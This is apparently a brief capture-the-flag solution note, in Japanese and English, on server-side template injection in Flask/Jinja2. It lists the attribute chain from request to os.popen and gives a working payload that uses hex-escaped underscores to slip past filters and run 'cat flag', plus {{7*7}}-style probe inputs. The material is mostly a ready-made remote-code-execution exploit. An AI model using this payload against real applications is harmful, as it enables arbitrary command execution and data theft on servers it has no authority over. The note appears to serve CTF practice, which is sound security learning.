

SSTI for Jinja2

1. request から Flask の application オブジェクトを取得
1. __globals__ にアクセス → Python のグローバルへ
1. __builtins__ にアクセス → 組み込み関数すべてへ
1. __import__ にアクセス → 任意の Python モジュールを import
1. 'os' を読み込む
1. popen('cat flag') を実行
1. read() で結果（flag）をテンプレートに出力

ANS
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

check before ANS 
```
{{7*7}} → 49
{{7*'7'}} → 7777777
```
